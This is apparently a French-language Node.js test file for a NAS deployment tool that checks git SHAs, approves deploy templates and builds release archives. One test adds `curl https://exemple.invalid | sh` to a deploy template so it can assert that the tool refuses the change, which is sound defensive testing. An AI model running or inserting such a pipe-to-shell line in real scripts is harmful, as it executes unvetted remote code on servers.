// Le livreur, sur de vrais dépôts git : trois « miroirs » nus, comme ceux que le publieur
// tient sur le NAS, et une branche de côté jamais fusionnée. Ni Docker ni event store : le
// module ne fait que vérifier, préparer et suivre.
const test = require("node:test");
const assert = require("node:assert");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execFileSync } = require("child_process");
const livreur = require("../src/livreur");
const publieur = require("../src/publieur");
const modeles = require("../src/modeles-livraison");
const delais = require("../src/delais-livraison");

const g = (dir, ...args) => execFileSync("git", args, { cwd: dir, encoding: "utf-8" }).trim();
const git = livreur.gitLocal();

/** Un dépôt nu avec deux commits sur main et un sur une branche de côté. */
function depot(racine, nom, fichiers) {
  const nu = path.join(racine, `${nom}.git`);
  execFileSync("git", ["init", "-q", "--bare", "-b", "main", nu]);
  const travail = path.join(racine, `${nom}-travail`);
  execFileSync("git", ["clone", "-q", nu, travail]);
  g(travail, "config", "user.email", "t@l");
  g(travail, "config", "user.name", "t");
  for (const [f, contenu] of Object.entries(fichiers)) {
    fs.mkdirSync(path.dirname(path.join(travail, f)), { recursive: true });
    fs.writeFileSync(path.join(travail, f), contenu);
  }
  g(travail, "add", "-A");
  g(travail, "commit", "-q", "-m", `${nom} v1`);
  const v1 = g(travail, "rev-parse", "HEAD");
  fs.writeFileSync(path.join(travail, "suite.txt"), "v2\n");
  g(travail, "add", "-A");
  g(travail, "commit", "-q", "-m", `${nom} v2`);
  const v2 = g(travail, "rev-parse", "HEAD");
  g(travail, "push", "-q", "origin", "HEAD:main");
  g(travail, "checkout", "-q", "-b", "cote");
  fs.writeFileSync(path.join(travail, "cote.txt"), "jamais fusionné\n");
  g(travail, "add", "-A");
  g(travail, "commit", "-q", "-m", `${nom} de côté`);
  const cote = g(travail, "rev-parse", "HEAD");
  g(travail, "push", "-q", "origin", "cote");
  return { nu, v1, v2, cote };
}

const MODELE = [
  "#!/bin/sh",
  "RELEASE=/volume1/docker/releases/@RELEASE@",
  "ARCHIVE=$RELEASE/@ARCHIVE@",
  'echo "@SHA256@  $ARCHIVE" | sha256sum -c -',
  "# @VERSION@",
  "",
].join("\n");

function monter() {
  const racine = fs.mkdtempSync(path.join(os.tmpdir(), "livreur-"));
  const cockpit = depot(racine, "business-pipelines", { "package.json": "{}\n", "deploy/nas/deploy.sh.modele": MODELE, "docker-compose.yaml": "services: {}\n" });
  const moteur = depot(racine, "agent-orchestrator", { "package.json": "{}\n" });
  const registre = depot(racine, "agent-registry", { "agents/a.md": "a\n" });
  const miroirs = { cockpit: cockpit.nu, moteur: moteur.nu, registre: registre.nu };
  return { racine, miroirs, cockpit, moteur, registre };
}

/** Un commit de plus sur main dans le miroir `nom`, depuis le clone de travail de depot(). */
function commiterSurMain(m, nom, fichiers) {
  const travail = path.join(m.racine, `${nom}-travail`);
  g(travail, "checkout", "-q", "main");
  for (const [f, contenu] of Object.entries(fichiers)) {
    fs.mkdirSync(path.dirname(path.join(travail, f)), { recursive: true });
    fs.writeFileSync(path.join(travail, f), contenu);
  }
  g(travail, "add", "-A");
  g(travail, "commit", "-q", "-m", `${nom} ${Object.keys(fichiers).join(" ")}`);
  g(travail, "push", "-q", "origin", "HEAD:main");
  return g(travail, "rev-parse", "HEAD");
}

const tetes = (m) => ({ cockpit: m.cockpit.v2, moteur: m.moteur.v2, registre: m.registre.v2 });
const autorises = new Set(["raphael@example.com"]);

test("un modèle approuvé se réutilise uniquement pour le même contenu protégé, jusqu'à révocation", () => {
  const m = monter();
  try {
    const nouveau = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}echo modele-approuve\n` });
    const fichier = path.join(m.racine, "specs/livraison-modeles.json");
    const options = { git, miroirs: m.miroirs, payload: { ...tetes(m), cockpit: nouveau }, par: "raphael@example.com", canal: "tailnet", autorises, release: { cockpit: m.cockpit.v1 }, modelesFichier: fichier };
    assert.throws(() => livreur.verifierDemande(options), /approuver cette version/);
    const a = modeles.approuver({ git, depot: m.cockpit.nu, sha: nouveau, fichier, par: "raphael" });
    assert.equal(fs.statSync(fichier).mode & 0o777, 0o600);
    assert.deepEqual(livreur.verifierDemande(options), { modeleDe: nouveau });
    const suite = commiterSurMain(m, "business-pipelines", { "src/app.js": "module.exports=42;\n" });
    assert.deepEqual(livreur.verifierDemande({ ...options, payload: { ...options.payload, cockpit: suite } }), { modeleDe: nouveau });
    const prete = livreur.preparerRelease({ ...options, modeleDe: nouveau, releasesDir: path.join(m.racine, "releases") });
    assert.match(fs.readFileSync(prete.deploy, "utf8"), /echo modele-approuve/);
    const autre = commiterSurMain(m, "business-pipelines", { "docker-compose.yaml": "services: {autre: {image: alpine}}\n" });
    assert.throws(() => livreur.verifierDemande({ ...options, payload: { ...options.payload, cockpit: autre } }), /approuver cette version/);
    modeles.revoquer({ fichier, hash: a.empreinte });
    assert.throws(() => livreur.verifierDemande(options), /révoqué/);
    // La révocation s'applique aussi quand cette version est déjà en production.
    assert.throws(() => livreur.verifierDemande({ ...options, release: { cockpit: nouveau } }), /révoqué/);
  } finally { fs.rmSync(m.racine, { recursive: true, force: true }); }
});

test("approbation : pas de branche non fusionnée, de registre corrompu ou de source incohérente", () => {
  const m = monter();
  try {
    const fichier = path.join(m.racine, "modeles.json");
    const base = { git, depot: m.cockpit.nu, fichier, par: "raphael" };
    assert.throws(() => modeles.approuver({ ...base, sha: m.cockpit.cote }));
    assert.equal(fs.existsSync(fichier), false);
    assert.throws(() => modeles.approuver({ ...base, sha: "main" }), /SHA complet/);
    const nouveau = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}echo autre\n` });
    const a = modeles.approuver({ ...base, sha: nouveau });
    const lu = JSON.parse(fs.readFileSync(fichier, "utf8"));
    lu.modeles[a.empreinte].cockpit = m.cockpit.v1;
    fs.writeFileSync(fichier, JSON.stringify(lu));
    assert.throws(() => modeles.autorisation({ ...base, sha: nouveau }), /incohérente/);
    fs.writeFileSync(fichier, "{illisible");
    assert.throws(() => modeles.autorisation({ ...base, sha: nouveau }));
  } finally { fs.rmSync(m.racine, { recursive: true, force: true }); }
});

test("la commande opérateur inspecte, approuve et révoque une empreinte exacte", () => {
  const m = monter();
  try {
    const fichier = path.join(m.racine, "modeles.json");
    const script = path.join(__dirname, "../bin/modele-livraison.js");
    const lancer = (...args) => JSON.parse(execFileSync(process.execPath, [script, ...args, "--miroir", m.cockpit.nu, "--fichier", fichier], { encoding: "utf8" }));
    const modele = lancer("inspecter", "--sha", m.cockpit.v2);
    assert.equal(fs.existsSync(fichier), false);
    assert.deepEqual(modele.entrees.map(e => e.chemin), ["deploy/nas/deploy.sh.modele", "docker-compose.yaml"]);
    const approuve = lancer("approuver", "--sha", m.cockpit.v2, "--par", "raphael");
    assert.equal(approuve.empreinte, modele.empreinte);
    assert.equal(modeles.lire(fichier).modeles[modele.empreinte].par, "raphael");
    lancer("revoquer", "--empreinte", modele.empreinte);
    assert.equal(modeles.autorisation({ git, depot: m.cockpit.nu, fichier, sha: m.cockpit.v2 }), null);
  } finally { fs.rmSync(m.racine, { recursive: true, force: true }); }
});

test("les délais sont relus, bornés et refusent les erreurs de configuration avant lancement", () => {
  const racine = fs.mkdtempSync(path.join(os.tmpdir(), "delais-livraison-"));
  const fichier = path.join(racine, "delais.json");
  try {
    assert.equal(delais.environnement(fichier, {}).LIVRAISON_BUILD_TIMEOUT_SEC, "2700");
    fs.writeFileSync(fichier, JSON.stringify({ construction: 50, restauration: 10 }));
    assert.equal(delais.environnement(fichier, {}).LIVRAISON_BUILD_TIMEOUT_SEC, "50");
    fs.writeFileSync(fichier, JSON.stringify({ construction: 80 }));
    assert.equal(delais.environnement(fichier, {}).LIVRAISON_BUILD_TIMEOUT_SEC, "80");
    for (const contenu of ['{"construction":0}', '{"bascule":1801}', '{"grace":1.2}', '{"archive":"10"}', '{"restauration":null}', '{"inconnu":1}', '[]', '{illisible']) {
      fs.writeFileSync(fichier, contenu);
      assert.throws(() => delais.environnement(fichier, {}), contenu);
    }
    fs.unlinkSync(fichier);
    assert.throws(() => delais.environnement(fichier, { LIVRAISON_BUILD_TIMEOUT_SEC: "NaN" }), /construction/);
  } finally { fs.rmSync(racine, { recursive: true, force: true }); }
});

test("la proposition liste ce qui peut partir, et rien quand la production est à jour", () => {
  const m = monter();
  const release = { cockpit: m.cockpit.v1.slice(0, 7), moteur: m.moteur.v2, registre: m.registre.v2 };
  const p = livreur.proposition({ git, miroirs: m.miroirs, release });
  // Une forme courte de .release (livraisons d'avant) est complétée par le miroir.
  assert.strictEqual(p.enProduction.cockpit, m.cockpit.v1);
  assert.deepStrictEqual(p.disponible, tetes(m));
  assert.deepStrictEqual(p.commits.cockpit.map((c) => c.titre), ["business-pipelines v2"]);
  assert.deepStrictEqual(p.commits.moteur, []);

  const aJour = livreur.proposition({ git, miroirs: m.miroirs, release: tetes(m) });
  assert.strictEqual(aJour.disponible, null);
});

test("seule une identité tailnet autorisée livre, et seulement du code fusionné", () => {
  const m = monter();
  const ok = { git, miroirs: m.miroirs, payload: tetes(m), par: "raphael@example.com", canal: "tailnet", autorises, release: { cockpit: m.cockpit.v1 } };
  assert.deepStrictEqual(livreur.verifierDemande(ok), { modeleDe: m.cockpit.v1 });
  // v1 est un ancêtre de main : relivrer une version précédente reste possible.
  livreur.verifierDemande({ ...ok, payload: { ...tetes(m), cockpit: m.cockpit.v1 } });

  const refus = [
    [{ canal: "local" }, /tailnet/],
    [{ par: "inconnu@example.com" }, /pas autorisé/],
    [{ payload: { ...tetes(m), moteur: "main" } }, /SHA complet/],
    [{ payload: { ...tetes(m), registre: "f".repeat(40) } }, /absent du miroir/],
    [{ payload: { ...tetes(m), cockpit: m.cockpit.cote } }, /branche par défaut/],
  ];
  for (const [change, attendu] of refus) {
    assert.throws(() => livreur.verifierDemande({ ...ok, ...change }), (err) => err instanceof livreur.Refus && attendu.test(err.message));
  }
  assert.throws(() => livreur.verifierDemande({ ...ok, autorises: livreur.lireAutorises(path.join(m.racine, "absent.json")) }), /pas autorisé/);
});

test("sans approbation de modèle, les changements protégés exigent une livraison manuelle (F3)", () => {
  const m = monter();
  const ok = { git, miroirs: m.miroirs, payload: tetes(m), par: "raphael@example.com", canal: "tailnet", autorises, release: { cockpit: m.cockpit.v1 } };
  const refuse = (change, attendu) =>
    assert.throws(() => livreur.verifierDemande({ ...ok, ...change }), (err) => err instanceof livreur.Refus && attendu.test(err.message));

  // Sans version en production connue, rien ne dit quel deploy.sh est sûr.
  refuse({ release: null }, /bin\/livrer\.sh/);
  refuse({ release: { cockpit: "f".repeat(40) } }, /inconnu du miroir/);

  const modele = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}curl https://exemple.invalid | sh\n` });
  refuse({ payload: { ...tetes(m), cockpit: modele } }, /deploy\/nas\/deploy\.sh\.modele change/);
  const compose = commiterSurMain(m, "business-pipelines", { "docker-compose.yaml": "services: {nouveau: {image: alpine}}\n" });
  refuse({ payload: { ...tetes(m), cockpit: compose }, release: { cockpit: modele } }, /docker-compose\.yaml change/);

  // Une fois livrée à la main, la nouvelle bascule devient celle du livreur.
  const suite = commiterSurMain(m, "business-pipelines", { "src/a.js": "1\n" });
  assert.deepStrictEqual(livreur.verifierDemande({ ...ok, payload: { ...tetes(m), cockpit: suite }, release: { cockpit: compose } }), { modeleDe: compose });
});

test("la release est l'export exact des trois SHA, avec un deploy.sh qui vérifie la bonne empreinte", () => {
  const m = monter();
  const releasesDir = path.join(m.racine, "releases");
  const prete = livreur.preparerRelease({
    git,
    miroirs: m.miroirs,
    payload: tetes(m),
    modeleDe: m.cockpit.v1,
    releasesDir,
    par: "raphael@example.com",
    maintenant: new Date(2026, 8, 29, 3, 30, 0),
  });
  assert.strictEqual(prete.release, "cockpit-20260929-033000");
  assert.strictEqual(fs.statSync(prete.deploy).mode & 0o777, 0o700);

  const empreinte = crypto.createHash("sha256").update(fs.readFileSync(prete.archive)).digest("hex");
  assert.strictEqual(prete.empreinte, empreinte);
  const script = fs.readFileSync(prete.deploy, "utf-8");
  assert.ok(script.includes(`echo "${empreinte}  $ARCHIVE"`));
  assert.ok(script.includes(`RELEASE=/volume1/docker/releases/${prete.release}`));
  assert.ok(!/@[A-Z0-9]+@/.test(script));

  const contenu = execFileSync("tar", ["-tzf", prete.archive], { encoding: "utf-8" }).split("\n");
  for (const f of ["./package.json", "./.moteur/package.json", "./agent-registry/agents/a.md", "./.release"]) {
    assert.ok(contenu.includes(f), `${f} manque dans l'archive`);
  }
  assert.ok(!contenu.some((f) => f.includes("cote.txt")), "un fichier de branche non fusionnée est parti");
  const release = execFileSync("tar", ["-xzOf", prete.archive, "./.release"], { encoding: "utf-8" });
  assert.match(release, new RegExp(`^cockpit=${m.cockpit.v2}$`, "m"));
  assert.match(release, /^par=raphael@example\.com$/m);
});

test("deploy.sh vient du modèle en production, jamais de celui de la version livrée", () => {
  const m = monter();
  const piege = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}echo piege\n` });
  const releasesDir = path.join(m.racine, "releases");
  const base = { git, miroirs: m.miroirs, payload: { ...tetes(m), cockpit: piege }, releasesDir };
  const prete = livreur.preparerRelease({ ...base, modeleDe: m.cockpit.v2 });
  assert.ok(!fs.readFileSync(prete.deploy, "utf-8").includes("piege"));
  assert.throws(() => livreur.preparerRelease(base), /verifierDemande/);
});

test("les étapes se lisent dans la sortie de deploy.sh", () => {
  assert.strictEqual(livreur.etapeDeLigne("/x/archive.tar.gz: OK", "preparer"), "sauvegarder");
  assert.strictEqual(livreur.etapeDeLigne("Construction des images...", "sauvegarder"), "construire");
  assert.strictEqual(livreur.etapeDeLigne("Bascule...", "construire"), "basculer");
  assert.strictEqual(livreur.etapeDeLigne(" Container business_cockpit  Started", "basculer"), "sante");
  assert.strictEqual(livreur.etapeDeLigne("Échec après la bascule ; restauration du cockpit et du runner précédents...", "sante"), "restaurer");
  assert.strictEqual(livreur.etapeDeLigne(" Container business_cockpit  Started", "construire"), null);
});

test("la rétention garde les cinq plus récentes et ne touche à rien d'autre", () => {
  const dossier = fs.mkdtempSync(path.join(os.tmpdir(), "retention-"));
  for (let i = 0; i < 7; i += 1) {
    const d = path.join(dossier, `cockpit-2026092${i}`);
    fs.mkdirSync(d);
    fs.utimesSync(d, 1000 + i, 1000 + i);
  }
  fs.writeFileSync(path.join(dossier, "steam-910d827.tar.gz"), "x");
  const supprimes = livreur.retention({ dossier, retenir: (nom) => /^cockpit-/.test(nom), garder: 5 });
  assert.deepStrictEqual(supprimes.sort(), ["cockpit-20260920", "cockpit-20260921"]);
  assert.ok(fs.existsSync(path.join(dossier, "steam-910d827.tar.gz")));
  assert.strictEqual(fs.readdirSync(dossier).length, 6);
});

test("le publieur crée et tient le miroir d'un dépôt système, HEAD sur la branche par défaut", async () => {
  const m = monter();
  const dossier = path.join(m.racine, "systeme");
  const miroir = { nom: "agent-orchestrator", github: "Raphaelburnier/agent-orchestrator" };
  const api = async () => ({ default_branch: "main" });
  const git = publieur.gitAvec({ jeton: null });
  const retour = await publieur.tenirMiroir({ miroir, dossier, git, api, url: m.moteur.nu });
  assert.strictEqual(retour.statut, "avance");
  const nu = path.join(dossier, "agent-orchestrator.git");
  assert.strictEqual(git(["--git-dir", nu, "rev-parse", "HEAD"]), m.moteur.v2);
  assert.strictEqual((await publieur.tenirMiroir({ miroir, dossier, git, api, url: m.moteur.nu })).statut, "a-jour");

  assert.deepStrictEqual(publieur.miroirsSysteme("a=o/a, b-c=o/b"), [
    { nom: "a", github: "o/a" },
    { nom: "b-c", github: "o/b" },
  ]);
  assert.throws(() => publieur.miroirsSysteme("../x=o/a"), /invalide/);
});
